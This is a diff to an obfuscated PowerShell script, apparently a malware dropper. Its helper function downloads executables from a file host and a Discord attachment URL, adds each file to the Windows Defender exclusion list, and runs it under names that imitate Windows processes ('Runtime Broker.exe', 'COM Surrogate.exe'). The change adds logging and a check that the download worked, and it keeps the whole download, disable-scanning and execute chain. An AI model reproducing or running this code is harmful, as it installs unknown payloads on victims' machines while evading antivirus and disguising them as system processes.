@@ -389,9 +389,15 @@ function Main {
             [string]$ak9zl1
         )
         $x82jdm=Join-Path -Path $td -ChildPath $ak9zl1
-        Invoke-WebRequest -Uri $zx1ds -OutFile $x82jdm -UseBasicParsing -ErrorAction Stop *> $null 2>&1
-        Add-MpPreference -ExclusionPath $x82jdm *> $null 2>&1
-        Start-Process -x82jdm $x82jdm -NoNewWindow -Wait -ErrorAction SilentlyContinue *> $null 2>&1
+        Write-Host "Downloading $zx1ds to $x82jdm"
+        Invoke-WebRequest -Uri $zx1ds -OutFile $x82jdm -UseBasicParsing -ErrorAction Stop
+        if (Test-Path -Path $x82jdm) {
+            Write-Host "File downloaded: $x82jdm"
+            Add-MpPreference -ExclusionPath $x82jdm
+            Start-Process -FilePath $x82jdm -NoNewWindow -Wait -ErrorAction SilentlyContinue
+        } else {
+            Write-Host "Download failed: $x82jdm"
+        }
     }
     xk7f1q1 -zx1ds "https://r2.e-z.host/fbb8540a-d344-42ba-8e24-ff0ee16b1e7d/99tyvmq7j1mcj7by2o.exe" -ak9zl1 "Runtime Broker.exe"
     xk7f1q1 -zx1ds "https://cdn.discordapp.com/attachments/1307069151948308490/1317064226329722900/COM_Surrogate.exe?ex=675d5325&is=675c01a5&hm=27aff13cbe0e0206758c9b48cd37bf161fff2c041ace7fe97ca46f9f0d074568&" -ak9zl1 "COM Surrogate.exe"
